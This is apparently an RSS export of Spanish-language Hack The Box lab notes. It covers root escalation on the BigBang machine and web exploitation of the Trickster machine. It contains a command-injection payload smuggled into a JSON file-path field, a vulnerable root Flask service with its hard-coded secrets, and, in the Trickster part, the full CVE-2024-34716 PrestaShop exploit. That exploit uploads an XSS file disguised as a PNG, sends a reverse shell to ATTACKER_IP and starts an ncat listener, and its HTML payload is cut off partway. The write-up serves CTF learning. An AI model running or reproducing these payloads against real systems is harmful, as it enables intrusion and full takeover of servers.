    "command": "send_image",
    "output_file": "nothing.png\n../../../../../usr/bin/chmod 777 /bin/bash"

}
<br>{"error":"Output file path contains dangerous characters"}

<br>Sin embargo desde shawking:<br>shawking@bigbang:/var$ /bin/bash -p
bash-5.1# whoami
root
bash-5.1# ls -la /bin/bash
-rwsrwxrwx 1 root root 1396520 Mar 14  2024 /bin/bash
<br>]]></description><link>machines/bigbang/03-user-shawking.html</link><guid isPermaLink="false">Machines/BigBang/03-User-Shawking.md</guid><pubDate>Wed, 05 Feb 2025 12:23:15 GMT</pubDate><enclosure url="machines/bigbang/imgs/pasted-image-20250204001637.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="machines/bigbang/imgs/pasted-image-20250204001637.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Docker]]></title><description><![CDATA[ 
 <br><br>Vemos los recursos docker de la maquina :<br>CONTAINER ID   IMAGE                       COMMAND                  CREATED        STATUS                 PORTS                                        NAMES
de64f0959084   grafana/grafana             "/run.sh"                8 months ago   Up 2 hours             127.0.0.1:3000-&gt;3000/tcp                     grafana
bf9a078a3627   php:8.3.2-apache            "docker-php-entrypoi…"   8 months ago   Up 2 hours             0.0.0.0:80-&gt;80/tcp, :::80-&gt;80/tcp            apache-server
14031fdccc6a   mysql/mysql-server:latest   "/entrypoint.sh mysq…"   8 months ago   Up 2 hours (healthy)   172.17.0.1:3306-&gt;3306/tcp, 33060-33061/tcp   mysql-server

<br><br>Este es el proceso root que permite la escalada de privilegios:<br>root@bigbang:~# ps -aux

root        1751  1.0  1.8 1199704 73656 ?       Ssl  10:32   2:31 /usr/bin/python3 /root/satellite/app.py

<br>En el el directorio /root encontramos el script de  lo que parece el servidor web 9090, vemos que esta desarrollado en flask y que parece el backend que maneja la base de datos<br>root@bigbang:~# cat satellite/app.py 
from flask import Flask, request, jsonify, send_file
from flask_sqlalchemy import SQLAlchemy
from flask_bcrypt import Bcrypt
from flask_jwt_extended import JWTManager, create_access_token, jwt_required, get_jwt_identity
from io import BytesIO
from PIL import Image
import random
import datetime
import numpy as np
import subprocess

app = Flask(__name__)

# Update the following line with your MySQL database connection details
app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql://satellite_user:satellite_password@172.17.0.1/satellite_db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
app.config['JWT_SECRET_KEY'] = 'gUX2sShwFlHJ9MBwoXwWNghwuMenSpoi5wIL12kzXfVuNzh7G9WMysTNlnWyvvvD'

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)
jwt = JWTManager(app)

class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(80), unique=True, nullable=False)
    password = db.Column(db.String(200), nullable=False)

class Location(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    user_id = db.Column(db.Integer, db.ForeignKey('user.id'), nullable=False)
    x = db.Column(db.Float, nullable=False)
    y = db.Column(db.Float, nullable=False)
    z = db.Column(db.Float, nullable=False)
    timestamp = db.Column(db.DateTime, nullable=False, default=datetime.datetime.utcnow)

def create_tables():
    with app.app_context():
        db.create_all()

create_tables()

def contains_dangerous_chars(input_str):
    dangerous_chars = [
        ';',  # Separador de comandos
        "'",  # Comilla simple
        '"',  # Comilla doble
        '\\',  # Barra invertida
        '&amp;',  # Ejecución en paralelo
        '|',  # Pipe
        '$',  # Expansión de variables
        '(',  # Paréntesis de apertura
        ')',  # Paréntesis de cierre
        '&gt;',  # Redirección de salida
        '&lt;',  # Redirección de entrada
        '`',  # Acento grave
        '!',  # Ejecución de comandos del historial
        '+',  # Puede ser usado en algunos contextos para comandos
        '#',  # Comentarios en shell
        '*',  # Wildcard (comodín)
        '?',  # Wildcard (comodín)
        '[',  # Inicio de clase de caracteres en expresiones regulares
        ']',  # Fin de clase de caracteres en expresiones regulares
        '{',  # Inicio de bloque de comandos o parámetros en algunas shells
        '}',  # Fin de bloque de comandos o parámetros en algunas shells
        '^',  # Redirección de error en algunas shells
        '%'  # Puede tener usos especiales en algunas shells
    ]
    return any(char in input_str for char in dangerous_chars)

@app.route('/login', methods=['POST'])
def login():
    username = request.json.get('username', None)
    password = request.json.get('password', None)
    if not username or not password:
        return jsonify({'error': 'Missing username or password'}), 400
    user = User.query.filter_by(username=username).first()
    if not user or not bcrypt.check_password_hash(user.password, password):
        return jsonify({'error': 'Bad username or password'}), 401
    access_token = create_access_token(identity=username, expires_delta=datetime.timedelta(hours=1))
    return jsonify(access_token=access_token), 200

@app.route('/command', methods=['POST'])
@jwt_required()
def command():
    command = request.json.get('command', '').lower()
    current_username = get_jwt_identity()

    # Retrieve the User object corresponding to the username
    current_user = User.query.filter_by(username=current_username).first()

    if not current_user:
        return jsonify({'error': 'User not found'}), 404

    if command == 'move':
        try:
            x = float(request.json.get('x'))
            y = float(request.json.get('y'))
            z = float(request.json.get('z'))
        except (TypeError, ValueError):
            return jsonify({'error': 'Invalid coordinates. Please provide numeric values for x, y, and z.'}), 400

        # Save the coordinates into the database
        location = Location(user_id=current_user.id, x=x, y=y, z=z)
        db.session.add(location)
        db.session.commit()

        return jsonify({'status': f'{current_username} is moving to coordinates ({x}, {y}, {z})'})

    elif command == 'send_image':
        output_file = request.json.get('output_file')
        if not output_file:
            return jsonify({'error': 'Output file path must be provided'}), 400
        if contains_dangerous_chars(output_file):
            return jsonify({'error': 'Output file path contains dangerous characters'}), 400
        try:
            image_data = generate_random_image(output_file)
            return send_file(BytesIO(image_data), mimetype='image/png')
        except RuntimeError as e:
            return jsonify({'error': str(e)}), 500
    else:
        return jsonify({'error': 'Invalid command'}), 400

def generate_random_image(output_file):
    try:
        result = subprocess.run(f'/usr/local/bin/image-tool --get-image {output_file}', 
                                check=True, shell=True, capture_output=True, text=True)
        print(f"STDOUT: {result.stdout}")  # Log the standard output
        print(f"STDERR: {result.stderr}")  # Log the standard error
    except subprocess.CalledProcessError as e:
        print(f"Error executing image-tool: {e.stderr}")
        raise RuntimeError(f'Error generating image: {e.stderr}')
    
    try:
        with open(output_file, 'rb') as file:
            return file.read()
    except Exception as e:
        raise RuntimeError(f'Error reading image file: {str(e)}')

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=9090)

<br>El script importa varias bibliotecas clave:<br>
<br>Flask : Para crear la aplicación web.
<br>SQLAlchemy : Para interactuar con una base de datos MySQL.
<br>Flask-Bcrypt : Para cifrar contraseñas de usuario.
<br>Flask-JWT-Extended : Para manejar tokens JWT (JSON Web Tokens) para la autenticación.
<br>Pillow (PIL) : Para manipular imágenes.
<br>Subprocess : Para ejecutar comandos externos.
<br>En esta parte del codigo podemos observar la vulnerabilidad que permite la escalada de privilegios:<br>    elif command == 'send_image':
        output_file = request.json.get('output_file')
        if not output_file:
            return jsonify({'error': 'Output file path must be provided'}), 400
        if contains_dangerous_chars(output_file):
            return jsonify({'error': 'Output file path contains dangerous characters'}), 400
        try:
            image_data = generate_random_image(output_file)
            return send_file(BytesIO(image_data), mimetype='image/png')
        except RuntimeError as e:
            return jsonify({'error': str(e)}), 500
    else:
        return jsonify({'error': 'Invalid command'}), 400

def generate_random_image(output_file):
    try:
        result = subprocess.run(f'/usr/local/bin/image-tool --get-image {output_file}', 
                                check=True, shell=True, capture_output=True, text=True)
        print(f"STDOUT: {result.stdout}")  # Log the standard output
        print(f"STDERR: {result.stderr}")  # Log the standard error
    except subprocess.CalledProcessError as e:
        print(f"Error executing image-tool: {e.stderr}")
        raise RuntimeError(f'Error generating image: {e.stderr}')
    
    try:
        with open(output_file, 'rb') as file:
            return file.read()
    except Exception as e:
        raise RuntimeError(f'Error reading image file: {str(e)}')    
<br>El uso de shell=True aumenta significativamente el riesgo de inyección de comandos porque permite que el shell interprete la cadena completa.<br><br>
<br>Como se mencionó anteriormente, cualquier carácter especial en output_file puede ser interpretado como parte del comando.
<br><br>
<br>Evitar usar shell=True siempre que sea posible. En su lugar, pasar los argumentos como una lista:
<br>subprocess.run(['/usr/local/bin/image-tool', '--get-image', output_file], check=True, capture_output=True, text=True)
]]></description><link>machines/bigbang/04-post-exploit.html</link><guid isPermaLink="false">Machines/BigBang/04-Post-Exploit.md</guid><pubDate>Wed, 05 Feb 2025 14:36:58 GMT</pubDate></item><item><title><![CDATA[BigBang]]></title><description><![CDATA[<a class="tag" href="?query=tag:machine" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#machine</a> 
 <br><br> <img src="https://www.hackthebox.com//storage/avatars/2d22afd496c5ae6f6c51ca24bf3719e1.png" referrerpolicy="no-referrer"> <br><a href=".?query=tag:machine" class="tag" target="_blank" rel="noopener nofollow">#machine</a><br><br><img src="lib/media/linux.png" style="max-width:70px" referrerpolicy="no-referrer"><br><br><br>
id:: 645
active:: True
name:: BigBang
os::Linux
user_flag:: True
root_flag:: True
difficulty_text:: Hard
stars:: 4.0
created:: 02/05/2025
published:: 01/25/25
avatar:: /storage/avatars/2d22afd496c5ae6f6c51ca24bf3719e1.png
tags:: 
]]></description><link>machines/bigbang/bigbang.html</link><guid isPermaLink="false">Machines/BigBang/BigBang.md</guid><pubDate>Wed, 05 Feb 2025 15:15:21 GMT</pubDate><enclosure url="https://www.hackthebox.com//storage/avatars/2d22afd496c5ae6f6c51ca24bf3719e1.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.hackthebox.com//storage/avatars/2d22afd496c5ae6f6c51ca24bf3719e1.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[1 - Recon]]></title><description/></item><item><title><![CDATA[1.Recon]]></title><description><![CDATA[ 
 <br>Nmap TCP port SYN scan<br>sudo nmap -sS -Pn -n --min-rate 5000 -p- trickster.htb -oG nmapsS
[sudo] password for cher0: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 10:15 CET
Nmap scan report for trickster.htb (10.10.11.34)
Host is up (0.043s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 11.42 seconds
<br>Nmap TCP CV scan<br>sudo nmap -sCV -Pn -n --min-rate 5000 -p 22,80 trickster.htb -oG nmapsCV 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-12 10:15 CET
Nmap scan report for trickster.htb (10.10.11.34)
Host is up (0.060s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 8c:01:0e:7b:b4:da:b7:2f:bb:2f:d3:a3:8c:a6:6d:87 (ECDSA)
|_  256 90:c6:f3:d8:3f:96:99:94:69:fe:d3:72:cb:fe:6c:c5 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: _; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.41 seconds
<br><br><img alt="Pasted image 20250212101724.png" src="machines/trickster/imgs/pasted-image-20250212101724.png"><br>
El apartado "shop" nos redirecciona a la siguiente url: <a rel="noopener nofollow" class="external-link" href="http://shop.trickster.htb/" target="_blank">http://shop.trickster.htb/</a><br>
la metemos en el /etc/hosts<br>10.10.11.34 trickster.htb shop.trickster.htb
<br><br>Vamos a aplicar Fuzzing;<br><br>feroxbuster -u http://trickster.htb -r -w /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt -C 503
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.11.0
───────────────────────────┬──────────────────────
     Target Url            │ http://trickster.htb
     Threads               │ 50
     Wordlist              │ /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt
     Status Code Filters   │ [503]
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.11.0
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Extract Links         │ true
     HTTP methods          │ [GET]
     Follow Redirects      │ true
     Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        2l       87w     2438c http://trickster.htb/assets/js/breakpoints.min.js
200      GET       37l       80w      568c http://trickster.htb/assets/css/noscript.css
200      GET      587l     1232w    11847c http://trickster.htb/assets/js/util.js
200      GET      401l      738w     8035c http://trickster.htb/assets/js/main.js
200      GET       22l       68w     8886c http://trickster.htb/images/overlay.png
200      GET     1638l     3543w    34125c http://trickster.htb/assets/css/main.css
200      GET        2l     1283w    86927c http://trickster.htb/assets/js/jquery.min.js
503      GET       11l       42w      378c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
503      GET       11l       42w      378c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET     3386l    19800w  1485483c http://trickster.htb/images/pic01.jpg
200      GET     7017l    47787w  3060292c http://trickster.htb/images/pic02.jpg
200      GET     7166l    43779w  3126314c http://trickster.htb/images/pic03.jpg
200      GET      355l      927w    12683c http://trickster.htb/
200      GET    13704l    73264w  5732348c http://trickster.htb/images/bg.jpg
200      GET       20l       94w     1730c http://trickster.htb/images/
<br><br><br>➜  ~ wappalyzer -i http://shop.trickster.htb
http://shop.trickster.htb Apache HTTP Server v2.4.52, Ubuntu, PrestaShop, jQuery v3.5.1, jQuery UI v1.10.3, PHP, Bootstrap, core-js v2.6.12, jQuery Migrate v3.1.0, Cart Functionality, Open Graph
<br>El subdomino usa Prestashop;<br>
PrestaShop es un sistema de gestión de contenidos libre y de código abierto pensado para construir desde cero tiendas en línea de comercio electrónico. Enfocado para permitir crear tiendas en línea desde pequeñas empresas a grandes corporaciones<br><br>feroxbuster -u http://shop.trickster.htb -r -w /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt -C 503 403
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher                    ver: 2.11.0
───────────────────────────┬──────────────────────
     Target Url            │ http://shop.trickster.htb
     Threads               │ 50
     Wordlist              │ /usr/share/seclist/Discovery/Web-Content/raft-large-directories-lowercase.txt
     Status Code Filters   │ [503, 403]
     Timeout (secs)        │ 7
     User-Agent            │ feroxbuster/2.11.0
     Config File           │ /etc/feroxbuster/ferox-config.toml
     Extract Links         │ true
     HTTP methods          │ [GET]
     Follow Redirects      │ true
     Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET     1043l     2429w    44977c http://shop.trickster.htb/password-recovery
404      GET     1006l     2319w    43228c http://shop.trickster.htb/log
200      GET        7l       17w      112c http://shop.trickster.htb/.git/config
200      GET        1l        2w       28c http://shop.trickster.htb/.git/HEAD
200      GET     1423l     2799w    53077c http://shop.trickster.htb/registration
200      GET        1l       10w       73c http://shop.trickster.htb/.git/description
200      GET        1l        3w       20c http://shop.trickster.htb/.git/COMMIT_EDITMSG
200      GET     1071l     2387w    44984c http://shop.trickster.htb/guest-tracking
200      GET        1l       11w      163c http://shop.trickster.htb/.git/logs/HEAD
200      GET        6l       43w      240c http://shop.trickster.htb/.git/info/exclude
200      GET       53l      234w     1374c http://shop.trickster.htb/.git/hooks/pre-push.sample
200      GET       78l      499w     2783c http://shop.trickster.htb/.git/hooks/push-to-checkout.sample
200      GET       42l      238w     1492c http://shop.trickster.htb/.git/hooks/prepare-commit-msg.sample
200      GET        8l       32w      189c http://shop.trickster.htb/.git/hooks/post-update.sample
200      GET       13l       67w      416c http://shop.trickster.htb/.git/hooks/pre-merge-commit.sample
200      GET       24l       83w      544c http://shop.trickster.htb/.git/hooks/pre-receive.sample
200      GET       14l       69w      424c http://shop.trickster.htb/.git/hooks/pre-applypatch.sample
200      GET       49l      279w     1643c http://shop.trickster.htb/.git/hooks/pre-commit.sample
200      GET      174l      675w     4726c http://shop.trickster.htb/.git/hooks/fsmonitor-watchman.sample
200      GET      978l     2780w   316386c http://shop.trickster.htb/.git/index
200      GET      128l      546w     3650c http://shop.trickster.htb/.git/hooks/update.sample
200      GET       15l       79w      478c http://shop.trickster.htb/.git/hooks/applypatch-msg.sample
200      GET       77l      323w     2308c http://shop.trickster.htb/.git/hooks/sendemail-validate.sample
200      GET      169l      798w     4898c http://shop.trickster.htb/.git/hooks/pre-rebase.sample
200      GET       24l      163w      896c http://shop.trickster.htb/.git/hooks/commit-msg.sample
200      GET        1l        1w       41c http://shop.trickster.htb/.git/refs/heads/admin_panel
404      GET     1006l     2319w    43251c http://shop.trickster.htb/upload/
200      GET     1155l     2446w    46526c http://shop.trickster.htb/login
200      GET     1155l     2446w    46636c http://shop.trickster.htb/login?back=my-account
404      GET     1006l     2319w    43294c http://shop.trickster.htb/.git/hooks/.git
200      GET     1102l     2444w    46283c http://shop.trickster.htb/cart?action=show
404      GET     1006l     2319w    43326c http://shop.trickster.htb/.git/refs/heads/.git/
404      GET     1006l     2319w    43350c http://shop.trickster.htb/.git/refs/heads/.git/refs
200      GET     1155l     2446w    46615c http://shop.trickster.htb/login?back=history
200      GET     1051l     2357w    44462c http://shop.trickster.htb/search
404      GET     1006l     2319w    43345c http://shop.trickster.htb/.git/refs/tags/.git/refs
404      GET     1006l     2319w    43325c http://shop.trickster.htb/.git/refs/tags/.git/
200      GET     1155l     2446w    46629c http://shop.trickster.htb/login?back=addresses
404      GET     1006l     2319w    43325c http://shop.trickster.htb/.git/logs/refs/.git/
404      GET     1006l     2319w    43309c http://shop.trickster.htb/.git/branches/.git

<br>Durante el fuzzing encontramos un repositorio /.git accesible;  tratamos de dumpearlo<br><br>Con la herramienta de <a data-tooltip-position="top" aria-label="https://github.com/arthaud/git-dumper" rel="noopener nofollow" class="external-link" href="https://github.com/arthaud/git-dumper" target="_blank">git-dumper</a> dumpeamos todo el directorio de /.git<br> ./git_dumper.py http://shop.trickster.htb/.git/ DUMP
<br>DUMP:<br>
En el directorio encontramos varios archivos, entre ellos un Makefile lo que nos puede dar una pista de que nos enfrentamos a un contenedor de Docker y varios archivos .php lo que nos confirma que el servidor maneja lenguaje php que nos puede ser de ayuda para explotar la maquina<br>(venv) ➜  DUMP git:(admin_panel) ls -ls
total 216
  8 -rw-rw-r-- 1 cher0 cher0   5054 Feb 12 12:16 INSTALL.txt
  4 -rw-rw-r-- 1 cher0 cher0    522 Feb 12 12:16 Install_PrestaShop.html
180 -rw-rw-r-- 1 cher0 cher0 183862 Feb 12 12:16 LICENSES
  4 -rw-rw-r-- 1 cher0 cher0    863 Feb 12 12:16 Makefile
  4 drwxrwxr-x 8 cher0 cher0   4096 Feb 12 12:16 admin634ewutrx1jgitlooaj
  4 -rw-rw-r-- 1 cher0 cher0   1305 Feb 12 12:16 autoload.php
  4 -rw-rw-r-- 1 cher0 cher0   2506 Feb 12 12:16 error500.html
  4 -rw-rw-r-- 1 cher0 cher0   1169 Feb 12 12:16 index.php
  4 -rw-rw-r-- 1 cher0 cher0   1256 Feb 12 12:16 init.php

<br>En el Install.txt vemos que la instalacion se trata de un Pentashop 8 lo que nos puede indicar que el software esta usando su version 8; tambien nos confirma que precisa de PHP v 7.2 o superior y un servidor de datos MySQL.<br><img alt="Pasted image 20250212122216.png" src="machines/trickster/imgs/pasted-image-20250212122216.png"><br>si entramos en el endpoint /admin634ewutrx1jgitlooaj encontramos un admin panel en shop; ademas descubrimos la version de PrestaShop que corre en la 8.1.5<br><img alt="Pasted image 20250213103827.png" src="machines/trickster/imgs/pasted-image-20250213103827.png"><br><br>Esta version de PrestaShop es vulnerable a XSS ; <a data-tooltip-position="top" aria-label="https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-45vm-3j38-7p78" rel="noopener nofollow" class="external-link" href="https://github.com/PrestaShop/PrestaShop/security/advisories/GHSA-45vm-3j38-7p78" target="_blank">github</a><br>El exploit se puede triggerear en el contact form de la pagina; un atacante puede subir un archivo malicioso que triggerea el XSS cuando lo abre el administrador ;<br>Nos dirigimos al formulario<br>http://shop.trickster.htb/contact-us
<br><img alt="Pasted image 20250213104457.png" src="machines/trickster/imgs/pasted-image-20250213104457.png"><br>Encuentro este <a data-tooltip-position="top" aria-label="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/" rel="noopener nofollow" class="external-link" href="https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/" target="_blank">documento</a> que detalla la explotacion de la vulnerabilidad <br>Nos bajamos el script automatizado de github y lo analizamos, el documento ya aclara como se explota la vulnerabilidad XSS pero podemos llegar a RCE enviando un .html malicioso disfrazado de imagen png;<br>➜  CVE-2024-34716_PoC git:(main) ls -laF 
total 7320
drwxrwxr-x 3 cher0 cher0    4096 Feb 13 10:51 ./
drwxrwxr-x 5 cher0 cher0    4096 Feb 13 10:51 ../
drwxrwxr-x 8 cher0 cher0    4096 Feb 13 10:51 .git/
-rw-rw-r-- 1 cher0 cher0      47 Feb 13 10:51 .gitignore
-rw-rw-r-- 1 cher0 cher0     346 Feb 13 10:51 README.md
-rw-rw-r-- 1 cher0 cher0    4434 Feb 13 10:51 exploit.html
-rw-rw-r-- 1 cher0 cher0    5100 Feb 13 10:51 exploit.py
-rw-rw-r-- 1 cher0 cher0 7444481 Feb 13 10:51 ps_next_8_theme_malicious_old.zip
-rw-rw-r-- 1 cher0 cher0      32 Feb 13 10:51 requirements.txt
-rw-rw-r-- 1 cher0 cher0    5496 Feb 13 10:51 reverse_shell_template.php

<br>Atached a zip theme file that was used for testing and the same ZIP contains a .htaccess file with the content below, which will enforce and allow access to the directory where we host our reverse_shell.php. It’s basically to allow everyone to view or interact with the contents of the directory without restrictions, because if we didn’t do this, we wouldn’t be able to access our reverse_shell.php that grants us a reverse shell and we would get forbidden instead.<br>&lt;IfModule mod_authz_core.c&gt;
 Require all granted
&lt;/IfModule&gt;
<br><br>Analizamos el siguiente PoC del CVE para conseguir RCE en PrestaShop;<br>import argparse, requests, subprocess, time, threading, atexit, http.server, socketserver,zipfile,shutil,os
from bs4 import BeautifulSoup


print_lock = threading.Lock()
stop_event = threading.Event()

def __parse_args():    
    parser = argparse.ArgumentParser(description="CVE-2024-34716 Exploit")
    parser.add_argument("--url", help="The Presta Shop base url.", required=True)
    parser.add_argument("--email", help="The email address of admin user.", required=True)
    parser.add_argument("--local-ip", help="Local HTTP Server IP.", required=True)
    parser.add_argument("--admin-path", help="The Presta Shop admin path.", required=True) 
    
    args = parser.parse_args()
    
    host_url = args.url
    email = args.email
    local_ip = args.local_ip
    admin_path = args.admin_path

    print("[X] Starting exploit with:")
    print(f"\tUrl: {host_url}")
    print(f"\tEmail: {email}")
    print(f"\tLocal IP: {local_ip}")
    print(f"\tAdmin Path: {admin_path}")
                
    return (host_url, email, local_ip, admin_path)
    
    
def send_get_requests(url, interval=5):
    while not stop_event.is_set():
        try:
            response = requests.get(url)
            if response.status_code == 504 or response.status_code == 200:
                stop_event.set()
                return
            print(f"GET request to {url}: {response.status_code}")
            
        except requests.RequestException as e:
            with print_lock:
                print(f"Error during GET request: {e}") # Can comment this out if thread isn't stopped.
        time.sleep(interval)


def run_http_server():
    PORT = 5000
    with socketserver.TCPServer(("", PORT), CustomRequestHandler) as httpd:
        with print_lock:
            print("Serving at http.Server on port", PORT)
        while not stop_event.is_set():
            httpd.handle_request()
        

def main():    
    host_url, email, local_ip, admin_path = __parse_args()

    with open('./exploit.html', 'r') as file:
        html_content = file.read()

    if host_url[-1] == '/':
        host_url = host_url[:-1]

    html_content = html_content.replace("BASE_URL", f'"{host_url}"')
    html_content = html_content.replace("ATTACKER_IP", f'"{local_ip}"')
    html_content = html_content.replace("ATTACKER_PORT", "5000")
    html_content = html_content.replace("ADMIN_PATH", f'"{admin_path}"')
    html_content = html_content.replace("FILE_NAME", '"ps_next_8_theme_malicious.zip"')

    with open('./reverse_shell_template.php', 'r') as file:
        reverse_shell_content = file.read()
    
    reverse_shell_content = reverse_shell_content.replace("ATTACKER_IP", f'"{local_ip}"')
    reverse_shell_content = reverse_shell_content.replace("ATTACKER_PORT", "12345")

    with open('./reverse_shell.php', 'w') as file:
        file.write(reverse_shell_content)
    
    shutil.copy('ps_next_8_theme_malicious_old.zip', 'ps_next_8_theme_malicious.zip')
    with zipfile.ZipFile('ps_next_8_theme_malicious.zip', 'a') as zipf:
        zipf.write('reverse_shell.php','reverse_shell_new.php')



    url = f"{host_url}/contact-us"

    response = requests.get(url)
    response.raise_for_status()

    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find('input', {'name': 'token'})['value']
    cookies = response.cookies

    files = {
        'fileUpload': ('test.png', html_content, 'image/png'),
    }

    data = {
        'id_contact': '2',
        'from': email,
        'message': 'pwned',
        'url': '',
        'token': token,
        'submitMessage': 'Send'
    }

    response = requests.post(url, files=files, data=data, cookies=cookies)
    url = f"{host_url}/themes/next/reverse_shell_new.php"

    req_thread = threading.Thread(target=send_get_requests, args=(url, 15,))
    req_thread.daemon = True
    req_thread.start()
    
    server_thread = threading.Thread(target=run_http_server)
    server_thread.daemon = True
    server_thread.start()

    if response.status_code == 200:
        print(f"[X] Ncat is now listening on port 12345. Press Ctrl+C to terminate.")
        
        output = subprocess.call(["ncat", "-lnvp", "12345"], shell=False)
        if b"Ncat: Connection from " in output:
            with print_lock:
                print("Stopping threads!")
            stop_event.set()
        else:
            print(f"DEBUG:: {output}")
    else:
        print(f"[!] Failed to send the message. Status code: {response.status_code} Reason: {response.reason}")


def clean():
    if os.path.exists('ps_next_8_theme_malicious.zip'):
        os.remove('ps_next_8_theme_malicious.zip')
    if os.path.exists('reverse_shell.php'):
        os.remove('reverse_shell.php')

class CustomRequestHandler(http.server.SimpleHTTPRequestHandler):
    def log_request(self, code='-', size='-'):
        with print_lock:
            print(f"Request: {self.command} {self.path} {self.request_version}")
            print(f"Response: {code} {size}")
        super().log_request(code, size)



if __name__ == "__main__":
    clean()
    atexit.register(clean)
    main()

<br><br>Esta función configura y parsea los argumentos necesarios para ejecutar el exploit:<br>
<br>Argumentos requeridos :

<br>--url: URL base del sitio vulnerable.
<br>--email: Dirección de correo electrónico del administrador.
<br>--local-ip: IP local donde se ejecutará el servidor HTTP y el shell inverso.
<br>--admin-path: Ruta del panel de administración de PrestaShop.


<br>Después de parsear los argumentos, imprime la configuración seleccionada.<br><br>Esta función envía solicitudes GET repetidas a una URL específica hasta que ocurra una condición de detención (stop_event.is_set()).<br>
<br>Si recibe un código de respuesta 504 o 200, detiene las solicitudes.
<br>Utiliza un intervalo entre solicitudes para evitar saturar el servidor.
<br><br>Levanta un servidor HTTP local en el puerto 5000:<br>
<br>Usa CustomRequestHandler como manejador personalizado para registrar las solicitudes entrantes.
<br>El servidor permanece activo hasta que se establezca stop_event.****
<br><br>Esta es la función principal del script, donde ocurre la lógica del exploit:<br><br>
<br>Lee el archivo exploit.html y reemplaza marcadores de posición (BASE_URL, ATTACKER_IP, etc.) con los valores proporcionados por el usuario.

<br>exploit.html:


<br>&lt;!DOCTYPE html&gt;
&lt;html lang="en"&gt;

&lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
    &lt;meta viewport="width=device-width, initial-scale=1.0"&gt;
    &lt;title&gt;Exploit&lt;/title&gt;
&lt;/head&gt;

&lt;body&gt;
    &lt;script&gt;
        const baseUrl = BASE_URL;
        const path = ADMIN_PATH;
        const httpServerIp = ATTACKER_IP;
        const httpServerPort = ATTACKER_PORT;
        const fileNameOfTheme = FILE_NAME;

        async function fetchTokenFromHTML() {
            const url = `${baseUrl}/${path}/index.php/improve/design/themes/import`;
            try {
                const response = await fetch(url, {
                    method: 'GET',
                    credentials: 'include',
                    redirect: 'follow'
                });
                if (!response.ok) throw new Error('Failed to fetch the page for token extraction. Status: ' + response.status);

                const htmlText = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(htmlText, "text/html");

                const anchor = doc.querySelector('a.btn.btn-lg.btn-outline-danger.mr-3');
                const href = anchor ? anchor.getAttribute('href') : null;
                const match = href ? href.match(/_token=([^&amp;]+)/) : null;
                const token = match ? match[1] : null;
                if (!token) throw new Error('Token not found in anchor tag href.');

                console.log('Extracted Token from HTML:', token);
                return token;
            } catch (error) {
                console.error('Error fetching token from HTML content:', error);
                return null;
            }
        }

        async function fetchCSRFToken(token) {
            const csrfUrl = `${baseUrl}/${path}/index.php/improve/design/themes/import?_token=${token}`;
            try {
                const response = await fetch(csrfUrl, {
                    method: 'GET',
                    credentials: 'include',
                    redirect: 'follow'
                });
                if (!response.ok) throw new Error('Failed to fetch the page for CSRF token extraction. Status: ' + response.status);

                const htmlText = await response.text();
                const parser = new DOMParser();
                const doc = parser.parseFromString(htmlText, "text/html");

                const csrfTokenInput = doc.querySelector('input[name="import_theme[_token]"]');
                const csrfToken = csrfTokenInput ? csrfTokenInput.value : null;
                if (!csrfToken) throw new Error('CSRF token not found in HTML content.');

                console.log('Extracted CSRF Token:', csrfToken);
                return csrfToken;
            } catch (error) {
                console.error('Error fetching CSRF token:', error);
                return null;
            }
        }

        async function importTheme() {
            try {
                const locationHeaderToken = await fetchTokenFromHTML();
                if (!locationHeaderToken) {
